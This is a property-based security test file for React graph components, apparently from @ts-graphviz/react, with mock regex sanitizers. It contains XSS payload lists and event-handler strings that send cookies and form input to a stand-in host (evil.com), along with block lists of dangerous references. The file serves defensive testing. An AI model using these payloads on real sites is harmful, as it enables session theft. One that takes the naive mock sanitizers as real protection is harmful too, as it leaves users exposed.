import * as fc from 'fast-check';
import { describe, it, expect } from 'vitest';

/**
 * Security tests for React components in @ts-graphviz/react
 * These tests verify that React components safely handle potentially malicious props and JSX content
 */
describe('React Component Security Tests', () => {
  describe('JSX Injection Prevention', () => {
    it('should safely handle malicious JSX in node labels', () => {
      const maliciousJsx = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)"/>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload="alert(1)"><path/></svg>',
        '<div dangerouslySetInnerHTML={{__html: "<script>alert(1)</script>"}}/>',
        '<object data="data:text/html,<script>alert(1)</script>"></object>',
        '<embed src="javascript:alert(1)"/>',
        '<link rel="stylesheet" href="javascript:alert(1)"/>',
        '<style>body{background:url("javascript:alert(1)")}</style>',
        '${alert(1)}',
        '{alert(1)}',
        '{{alert(1)}}'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...maliciousJsx), (jsx) => {
          try {
            const result = sanitizeJsxContent(jsx);
            
            // Ensure dangerous JSX elements are removed or escaped
            expect(result).not.toMatch(/<script[^>]*>/i);
            expect(result).not.toMatch(/onerror\s*=/i);
            expect(result).not.toMatch(/onload\s*=/i);
            expect(result).not.toMatch(/javascript:/i);
            expect(result).not.toMatch(/dangerouslySetInnerHTML/i);
            expect(result).not.toMatch(/<iframe[^>]*>/i);
            expect(result).not.toMatch(/<object[^>]*>/i);
            expect(result).not.toMatch(/<embed[^>]*>/i);
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 100 }
      );
    });

    it('should handle malicious props in React components', () => {
      fc.assert(
        fc.property(
          fc.record({
            id: fc.oneof(fc.string(), fc.constantFrom('<script>', 'javascript:alert(1)')),
            label: fc.oneof(fc.string(), fc.constantFrom('<img onerror="alert(1)">', '${evil}')),
            onClick: fc.oneof(fc.string(), fc.constantFrom('alert(1)', 'eval("malicious")')),
            style: fc.oneof(fc.string(), fc.constantFrom('background:url(javascript:alert(1))', 'expression(alert(1))')),
            href: fc.oneof(fc.string(), fc.constantFrom('javascript:alert(1)', 'data:text/html,<script>'))
          }),
          (props) => {
            try {
              const sanitized = sanitizeReactProps(props);
              
              // Ensure dangerous values are sanitized
              expect(sanitized.id).not.toMatch(/<script/i);
              expect(sanitized.label).not.toMatch(/onerror/i);
              expect(sanitized.onClick).not.toMatch(/alert\(|eval\(/i);
              expect(sanitized.style).not.toMatch(/javascript:|expression\(/i);
              expect(sanitized.href).not.toMatch(/javascript:|data:text\/html/i);
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 150 }
      );
    });
  });

  describe('HTML-like Label Security', () => {
    it('should sanitize HTML-like labels safely', () => {
      const maliciousHtml = [
        '<table><tr><td onclick="alert(1)">cell</td></tr></table>',
        '<font color="red" onmouseover="alert(1)">text</font>',
        '<br onerror="alert(1)"/>',
        '<b onclick="alert(1)">bold</b>',
        '<i onload="alert(1)">italic</i>',
        '<u style="background:url(javascript:alert(1))">underline</u>',
        '<sub>H<sup onclick="alert(1)">2</sup>O</sub>',
        '<img src="" onerror="alert(1)" alt="evil"/>',
        '<a href="javascript:alert(1)">link</a>',
        '<span style="expression(alert(1))">text</span>'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...maliciousHtml), (html) => {
          try {
            const result = sanitizeHtmlLikeLabel(html);
            
            // Ensure event handlers are removed
            expect(result).not.toMatch(/on\w+\s*=/i);
            expect(result).not.toMatch(/javascript:/i);
            expect(result).not.toMatch(/expression\s*\(/i);
            expect(result).not.toMatch(/url\s*\(\s*javascript:/i);
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });

    it('should handle SVG injection in HTML-like labels', () => {
      const svgPayloads = [
        '<svg><script>alert(1)</script></svg>',
        '<svg onload="alert(1)"><circle/></svg>',
        '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
        '<svg><animate attributeName="onload" values="alert(1)"/></svg>',
        '<svg><set attributeName="onmouseover" to="alert(1)"/></svg>',
        '<svg><animateTransform attributeName="onclick" values="alert(1)"/></svg>',
        '<svg><use href="javascript:alert(1)"/></svg>',
        '<svg><image href="javascript:alert(1)"/></svg>',
        '<svg><feImage href="javascript:alert(1)"/></svg>',
        '<svg><text><tspan onclick="alert(1)">text</tspan></text></svg>'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...svgPayloads), (svg) => {
          try {
            const result = sanitizeSvgContent(svg);
            
            // Ensure SVG-specific attacks are prevented
            expect(result).not.toMatch(/<script[^>]*>/i);
            expect(result).not.toMatch(/onload\s*=/i);
            expect(result).not.toMatch(/onclick\s*=/i);
            expect(result).not.toMatch(/onmouseover\s*=/i);
            expect(result).not.toMatch(/href\s*=\s*["']javascript:/i);
            expect(result).not.toMatch(/<foreignObject[^>]*>/i);
            expect(result).not.toMatch(/attributeName\s*=\s*["']on\w+/i);
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('Component State Security', () => {
    it('should validate component state against injection', () => {
      fc.assert(
        fc.property(
          fc.record({
            nodeData: fc.array(fc.record({
              id: fc.string(),
              label: fc.string(),
              attributes: fc.dictionary(fc.string(), fc.oneof(fc.string(), fc.float(), fc.boolean()))
            })),
            edgeData: fc.array(fc.record({
              from: fc.string(),
              to: fc.string(),
              label: fc.string()
            })),
            graphConfig: fc.record({
              directed: fc.boolean(),
              rankdir: fc.oneof(fc.constantFrom('TB', 'LR', 'BT', 'RL'), fc.string()),
              bgcolor: fc.string()
            })
          }),
          (state) => {
            try {
              const validated = validateComponentState(state);
              
              // Ensure state is properly structured
              expect(validated).toHaveProperty('nodeData');
              expect(validated).toHaveProperty('edgeData');
              expect(validated).toHaveProperty('graphConfig');
              
              // Verify arrays are actually arrays
              expect(Array.isArray(validated.nodeData)).toBe(true);
              expect(Array.isArray(validated.edgeData)).toBe(true);
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle malicious component refs', () => {
      const maliciousRefs = [
        'window',
        'document',
        'eval',
        'alert',
        'console.log',
        'process.exit',
        'require("fs")',
        '__proto__',
        'constructor',
        'prototype',
        'Function',
        'Object.assign'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...maliciousRefs), (ref) => {
          try {
            const result = validateComponentRef(ref);
            
            // Ensure dangerous references are blocked
            expect(result).not.toBe('window');
            expect(result).not.toBe('document');
            expect(result).not.toBe('eval');
            expect(result).not.toBe('alert');
            expect(result).not.toMatch(/process\./);
            expect(result).not.toMatch(/require\(/);
            expect(result).not.toBe('__proto__');
            expect(result).not.toBe('constructor');
            expect(result).not.toBe('Function');
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('Event Handler Security', () => {
    it('should sanitize event handler props', () => {
      fc.assert(
        fc.property(
          fc.record({
            onClick: fc.oneof(fc.string(), fc.constantFrom('alert(1)', 'eval("evil")', 'window.location="http://evil.com"')),
            onMouseOver: fc.oneof(fc.string(), fc.constantFrom('document.write("<script>alert(1)</script>")')),
            onLoad: fc.oneof(fc.string(), fc.constantFrom('fetch("http://evil.com/steal?data="+document.cookie)')),
            onChange: fc.oneof(fc.string(), fc.constantFrom('new Image().src="http://evil.com/log?"+event.target.value'))
          }),
          (handlers) => {
            try {
              const sanitized = sanitizeEventHandlers(handlers);
              
              // Ensure dangerous code is removed from handlers
              for (const handler of Object.values(sanitized)) {
                if (typeof handler === 'string') {
                  expect(handler).not.toMatch(/alert\s*\(/);
                  expect(handler).not.toMatch(/eval\s*\(/);
                  expect(handler).not.toMatch(/document\.write/);
                  expect(handler).not.toMatch(/window\.location/);
                  expect(handler).not.toMatch(/fetch\s*\(/);
                  expect(handler).not.toMatch(/new\s+Image/);
                }
              }
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  describe('Component Composition Security', () => {
    it('should handle nested component injection', () => {
      fc.assert(
        fc.property(
          fc.array(
            fc.record({
              type: fc.oneof(fc.constantFrom('Node', 'Edge', 'Subgraph'), fc.string()),
              props: fc.dictionary(fc.string(), fc.oneof(fc.string(), fc.float(), fc.boolean())),
              children: fc.oneof(fc.string(), fc.array(fc.string()))
            }),
            { minLength: 1, maxLength: 10 }
          ),
          (components) => {
            try {
              const validated = validateComponentComposition(components);
              
              // Ensure all components have valid types
              for (const component of validated) {
                const validTypes = ['Node', 'Edge', 'Subgraph', 'Graph', 'Digraph'];
                expect(validTypes).toContain(component.type);
              }
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should prevent circular references in component trees', () => {
      fc.assert(
        fc.property(
          fc.integer({ min: 2, max: 20 }),
          (nodeCount) => {
            // Create potentially circular component structure
            const components = [];
            for (let i = 0; i < nodeCount; i++) {
              components.push({
                id: `node${i}`,
                children: [`node${(i + 1) % nodeCount}`] // Creates a cycle
              });
            }
            
            try {
              const result = detectCircularReferences(components);
              
              // Should detect circular references
              expect(result).toHaveProperty('hasCircle');
              if (nodeCount > 1) {
                expect(result.hasCircle).toBe(true);
              }
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 30 }
      );
    });
  });

  describe('Server-Side Rendering Security', () => {
    it('should handle SSR-specific security concerns', () => {
      const ssrPayloads = [
        '__NEXT_DATA__',
        '__webpack_require__',
        'process.env',
        'require.main',
        'module.exports',
        'global.process',
        '__dirname',
        '__filename',
        'Buffer.from',
        'fs.readFile'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...ssrPayloads), (payload) => {
          try {
            const result = sanitizeForSSR(payload);
            
            // Ensure server-side specific objects are not exposed
            expect(result).not.toMatch(/__NEXT_DATA__|__webpack_require__/);
            expect(result).not.toMatch(/process\.env|require\.main/);
            expect(result).not.toMatch(/module\.exports|global\./);
            expect(result).not.toMatch(/__dirname|__filename/);
            expect(result).not.toMatch(/Buffer\.|fs\./);
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });
});

// Mock security validation functions for React components
function sanitizeJsxContent(content: string): string {
  if (typeof content !== 'string') {
    throw new Error('Invalid JSX content');
  }

  // Remove dangerous JSX elements and attributes
  return content
    .replace(/<script[^>]*>.*?<\/script>/gi, '')
    .replace(/<iframe[^>]*>.*?<\/iframe>/gi, '')
    .replace(/<object[^>]*>.*?<\/object>/gi, '')
    .replace(/<embed[^>]*>/gi, '')
    .replace(/<link[^>]*>/gi, '')
    .replace(/on\w+\s*=\s*["'][^"']*["']/gi, '')
    .replace(/javascript:/gi, '')
    .replace(/dangerouslySetInnerHTML/gi, '')
    .replace(/\$\{[^}]*\}/g, '')
    .replace(/\{[^}]*\}/g, '');
}

function sanitizeReactProps(props: any): any {
  const sanitized: any = {};
  
  for (const [key, value] of Object.entries(props)) {
    if (typeof value === 'string') {
      sanitized[key] = value
        .replace(/<script[^>]*>/gi, '')
        .replace(/onerror\s*=/gi, '')
        .replace(/onload\s*=/gi, '')
        .replace(/onclick\s*=/gi, '')
        .replace(/javascript:/gi, '')
        .replace(/alert\s*\(/gi, '')
        .replace(/eval\s*\(/gi, '')
        .replace(/expression\s*\(/gi, '')
        .replace(/data:text\/html/gi, '');
    } else {
      sanitized[key] = value;
    }
  }
  
  return sanitized;
}

function sanitizeHtmlLikeLabel(html: string): string {
  if (typeof html !== 'string') {
    throw new Error('Invalid HTML content');
  }

  return html
    .replace(/on\w+\s*=\s*["'][^"']*["']/gi, '')
    .replace(/javascript:/gi, '')
    .replace(/expression\s*\([^)]*\)/gi, '')
    .replace(/url\s*\(\s*javascript:[^)]*\)/gi, '');
}

function sanitizeSvgContent(svg: string): string {
  if (typeof svg !== 'string') {
    throw new Error('Invalid SVG content');
  }

  return svg
    .replace(/<script[^>]*>.*?<\/script>/gi, '')
    .replace(/<foreignObject[^>]*>.*?<\/foreignObject>/gi, '')
    .replace(/on\w+\s*=\s*["'][^"']*["']/gi, '')
    .replace(/href\s*=\s*["']javascript:[^"']*["']/gi, '')
    .replace(/attributeName\s*=\s*["']on\w+["']/gi, '');
}

function validateComponentState(state: any): any {
  if (!state || typeof state !== 'object') {
    throw new Error('Invalid component state');
  }

  const validated = {
    nodeData: Array.isArray(state.nodeData) ? state.nodeData : [],
    edgeData: Array.isArray(state.edgeData) ? state.edgeData : [],
    graphConfig: typeof state.graphConfig === 'object' ? state.graphConfig : {}
  };

  // Validate node data
  validated.nodeData = validated.nodeData.filter(node => 
    node && typeof node === 'object' && typeof node.id === 'string'
  );

  // Validate edge data
  validated.edgeData = validated.edgeData.filter(edge =>
    edge && typeof edge === 'object' && 
    typeof edge.from === 'string' && typeof edge.to === 'string'
  );

  return validated;
}

function validateComponentRef(ref: string): string {
  const dangerous = [
    'window', 'document', 'eval', 'alert', 'console',
    'process', 'require', '__proto__', 'constructor',
    'prototype', 'Function', 'Object'
  ];

  if (dangerous.includes(ref) || /process\.|require\(/.test(ref)) {
    throw new Error(`Dangerous component ref: ${ref}`);
  }

  return ref;
}

function sanitizeEventHandlers(handlers: any): any {
  const sanitized: any = {};

  for (const [key, value] of Object.entries(handlers)) {
    if (typeof value === 'string') {
      sanitized[key] = value
        .replace(/alert\s*\([^)]*\)/gi, '')
        .replace(/eval\s*\([^)]*\)/gi, '')
        .replace(/document\.write\s*\([^)]*\)/gi, '')
        .replace(/window\.location\s*=/gi, '')
        .replace(/fetch\s*\([^)]*\)/gi, '')
        .replace(/new\s+Image\s*\(/gi, '');
    } else {
      sanitized[key] = value;
    }
  }

  return sanitized;
}

function validateComponentComposition(components: any[]): any[] {
  const validTypes = ['Node', 'Edge', 'Subgraph', 'Graph', 'Digraph'];
  
  return components
    .filter(comp => comp && typeof comp === 'object')
    .map(comp => ({
      ...comp,
      type: validTypes.includes(comp.type) ? comp.type : 'Node'
    }));
}

function detectCircularReferences(components: any[]): { hasCircle: boolean, cycle?: string[] } {
  const visited = new Set();
  const recursionStack = new Set();
  
  function dfs(nodeId: string, path: string[]): boolean {
    if (recursionStack.has(nodeId)) {
      return true; // Cycle detected
    }
    
    if (visited.has(nodeId)) {
      return false;
    }
    
    visited.add(nodeId);
    recursionStack.add(nodeId);
    
    const node = components.find(c => c.id === nodeId);
    if (node && node.children) {
      for (const child of node.children) {
        if (dfs(child, [...path, child])) {
          return true;
        }
      }
    }
    
    recursionStack.delete(nodeId);
    return false;
  }
  
  for (const component of components) {
    if (component.id && !visited.has(component.id)) {
      if (dfs(component.id, [component.id])) {
        return { hasCircle: true };
      }
    }
  }
  
  return { hasCircle: false };
}

function sanitizeForSSR(content: string): string {
  if (typeof content !== 'string') {
    throw new Error('Invalid content');
  }

  const serverPatterns = [
    /__NEXT_DATA__|__webpack_require__/g,
    /process\.env|require\.main/g,
    /module\.exports|global\./g,
    /__dirname|__filename/g,
    /Buffer\.|fs\./g
  ];

  let sanitized = content;
  for (const pattern of serverPatterns) {
    sanitized = sanitized.replace(pattern, '');
  }

  return sanitized;
}